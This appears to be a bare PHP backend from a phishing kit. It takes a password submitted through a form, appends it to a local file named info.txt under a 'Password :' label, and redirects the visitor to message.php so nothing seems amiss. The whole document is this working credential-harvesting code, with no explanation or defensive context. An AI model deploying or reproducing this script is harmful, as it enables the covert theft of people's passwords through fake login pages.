<?php
if(isset($_POST['pass']))
{
$c=$_POST['pass'];
$d=fopen("info.txt","a+");
fwrite($d,"Password : ");
fwrite($d,$c);
fwrite($d,"\r\n==============\r\n");
fclose($d);
header("Location: message.php");
}

?>